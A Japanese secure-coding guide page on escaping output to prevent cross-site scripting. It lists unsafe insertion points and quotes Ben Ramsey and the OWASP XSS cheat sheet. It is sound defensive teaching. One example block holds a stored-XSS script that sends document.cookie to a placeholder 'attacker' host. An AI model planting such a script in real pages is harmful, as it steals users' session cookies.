# 出力をエスケープする

### 一段落説明

HTML やその他のウェブ言語は、コンテンツと実行可能なコードを混在させています。- 1 つの HTML の段落には、JavaScript を実行することによって実現されているデータの視覚的な表現が含まれている場合があります。HTML をレンダリングしたり API からデータを返したりするときに、純粋なコンテンツだと思っていたものが、実際にはブラウザによって解釈され、実行される JavaScript コードを含んでいる場合があります。これは例えば、攻撃者によってデータベースに挿入されたコンテンツをレンダリングするときに起こります - `<div><script>//悪意のあるコード</script></div>` といったように。これを緩和するには、ブラウザに対して、信頼されていないデータのかたまりをコンテンツとしてのみ扱い、決して解釈しないように指示することが有効です - このテクニックはエスケープと呼ばれます。多くの npm ライブラリや HTML テンプレートエンジンがエスケープ機能を提供しています (例: [escape-html](https://github.com/component/escape-html)、[node-esapi](https://github.com/ESAPI/node-esapi))。HTMLコンテンツだけでなく、CSS や JavaScript もエスケープする必要があります。

### コード例 - 信頼されていないデータを HTML に挿入しない

```html
<script>...ここに信頼されていないデータを挿入しないでください...</script>   script タグの中に直接挿入する
 
 <!--...ここに信頼されていないデータを挿入しないでください...-->             HTML コメントアウトの中に挿入する
 
 <div ...ここに信頼されていないデータを挿入しないでください...=test />       属性名として挿入する
 
 <ここに信頼されていないデータを挿入しないでください... href="/test" />   要素名として挿入する
 
 <style>...ここに信頼されていないデータを挿入しないでください...</style>   CSS に直接挿入する

```

### コード例 - DB に注入される可能性のある悪質なコンテンツ

```html
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### ブログ引用: "When we don’t want the characters to be interpreted"（文字を解釈させたくない場合）

ブログ [benramsey.com](https://benramsey.com/articles/escape-output/) より
> データは、Webブラウザに送信される HTML、データベースに送信される SQL、RSS リーダーに送信される XML、ワイヤレスデバイスに送信される WML などの形でアプリケーションを離れる可能性があります。そのような可能性は至るところにあります。これらそれぞれのケースには、プレーンテキストとは異なる解釈をされる特殊文字のセットが存在します。時にこれらの特殊文字が解釈されるように送信したい場合もありますが（例えば Web ブラウザに送信される HTML タグなど）、他の場合においては（ユーザや他のソースからの入力の場合）、そういった文字を解釈されたくないので、エスケープする必要があります。

> エスケープは、エンコードと呼ばれることもあります。つまり、それはデータを、実行されたり解釈されたりしない形で表現するプロセスのことを指すのです。例えば、HTML において `<strong>` は特別な意味を持つので、ブラウザでは以下のようなテキストを太字テキストとして表示します:  
> `<strong>これは太字のテキストです</strong>`  
> ところで、ブラウザにタグを解釈させずに、タグそのものを表示させたい場合はどうすれば良いでしょうか。その場合は、HTML において特別な意味を持つ角括弧をエスケープする必要があります。以下はエスケープされた HTML を表します:  
> `&lt;strong&gt;これは太字のテキストです&lt;/strong&gt;`


<br/><br/>

### ブログ引用: "OWASP recommends using a security-focused encoding library"（OWASP はセキュリティに重点を置いたエンコードライブラリの利用を推奨します）

OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) より
> これらのエンコーダを書くことはそれほど難しいことではありませんが、いくつか落とし穴が隠れています。例えば、JavaScript の " のような、エスケープショートカットを使いたくなるかもしれません。しかしながら、このような値は危険であり、ブラウザのネストされたパーサーによって誤って解釈される可能性があります。また、エスケープ文字のエスケープを忘れる可能性もあり、これは攻撃者によって、安全化の試みを無効化するために利用されます。 **OWASP はこれらのルールが適切に実装されていることを確かにするために、セキュリティに重点を置いたエンコードライブラリの利用を推奨します。**


<br/><br/>

### ブログ引用: "You MUST use the escape syntax for the part of the HTML"
OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) より
> しかし、信頼されていないデータを、`<script>` タグの中や、onmouseover などのイベントハンドラの中、もしくは CSS の中や URL の中に入れていると、HTML エンティティのエンコーディングは機能しません。そのため、たとえすべての場所で HTML エンティティエンコーディングメソッドを利用していたとしても、XSS に対して脆弱である可能性が高いです。信頼されていないデータを入れている HTML ドキュメントの箇所には、**必ず** エスケープ構文を使用する必要があります。